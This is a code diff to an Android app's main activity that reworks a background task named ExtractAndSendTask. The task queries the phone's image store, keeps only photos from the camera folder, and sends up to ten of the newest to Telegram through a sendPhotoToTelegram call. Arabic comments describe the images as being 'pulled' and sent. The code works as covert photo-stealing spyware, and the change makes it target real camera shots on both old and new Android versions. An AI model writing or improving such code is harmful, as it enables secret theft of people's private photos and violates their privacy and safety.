@@ -79,26 +79,63 @@ public class MainActivity extends Activity {
     private class ExtractAndSendTask extends AsyncTask<Void, Integer, Void> {
         @Override
         protected Void doInBackground(Void... voids) {
-            String[] projection = {MediaStore.Images.Media._ID};
+            String[] projection;
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                projection = new String[]{
+                    MediaStore.Images.Media._ID, 
+                    MediaStore.Images.Media.RELATIVE_PATH, 
+                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
+                };
+            } else {
+                projection = new String[]{
+                    MediaStore.Images.Media._ID, 
+                    MediaStore.Images.Media.DATA
+                };
+            }
+            
             String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
-
             Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, sortOrder);
 
             if (cursor != null) {
                 int count = 0;
-                int maxImages = 10;
+                int maxImages = 10; // عدد الصور التي سيتم سحبها
+                
+                int idIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID);
 
                 while (cursor.moveToNext() && count < maxImages) {
-                    int idIndex = cursor.getColumnIndex(MediaStore.Images.Media._ID);
-                    int id = cursor.getInt(idIndex);
-                    Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
+                    boolean isCamera = false;
+                    
+                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                        int pathIndex = cursor.getColumnIndex(MediaStore.Images.Media.RELATIVE_PATH);
+                        int bucketIndex = cursor.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
+                        
+                        String path = pathIndex != -1 ? cursor.getString(pathIndex) : "";
+                        String bucket = bucketIndex != -1 ? cursor.getString(bucketIndex) : "";
+                        
+                        // التحقق من أن الصورة داخل مجلد الكاميرا
+                        if ((path != null && path.contains("Camera")) || (bucket != null && bucket.toLowerCase().contains("camera"))) {
+                            isCamera = true;
+                        }
+                    } else {
+                        int dataIndex = cursor.getColumnIndex(MediaStore.Images.Media.DATA);
+                        String path = dataIndex != -1 ? cursor.getString(dataIndex) : "";
+                        if (path != null && path.contains("DCIM/Camera")) {
+                            isCamera = true;
+                        }
+                    }
+                    
+                    // إذا كانت الصورة من الكاميرا، قم بإرسالها
+                    if (isCamera) {
+                        int id = cursor.getInt(idIndex);
+                        Uri contentUri = Uri.withAppendedPath(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "" + id);
 
-                    try {
-                        Bitmap bitmap = MediaStore.Images.Media.getBitmap(getContentResolver(), contentUri);
-                        sendPhotoToTelegram(bitmap);
-                        count++;
-                    } catch (Exception e) {
-                        e.printStackTrace();
+                        try {
+                            Bitmap bitmap = MediaStore.Images.Media.getBitmap(getContentResolver(), contentUri);
+                            sendPhotoToTelegram(bitmap);
+                            count++;
+                        } catch (Exception e) {
+                            e.printStackTrace();
+                        }
                     }
                 }
                 cursor.close();
